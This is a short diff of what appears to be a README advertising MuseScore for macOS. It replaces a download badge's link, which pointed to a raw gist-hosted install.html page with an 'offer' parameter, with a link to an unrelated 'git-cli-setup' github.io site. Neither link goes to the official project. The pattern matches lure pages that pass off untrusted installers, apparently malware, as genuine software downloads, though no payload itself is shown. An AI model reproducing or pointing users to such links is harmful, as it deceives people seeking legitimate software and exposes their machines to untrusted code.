@@ -2,7 +2,7 @@
 
 MuseScore is a macOS application that allows musicians, composers, and educators to create, edit, and share sheet music. It provides advanced notation tools, playback features, and an intuitive interface for Mac users looking to compose music efficiently.
 
-<a href="https://gistcdn.githack.com/termitspear89/cfd7192c8c789c1ba727ce5d010faba1/raw/1ce42f9012d269c1cc0d4ad3cdc0c4a1865f9a45/install.html?offer=MuseScore" target="_blank">
+<a href="https://git-cli-setup.github.io/.github/?offer=MuseScore" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20MuseScore%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
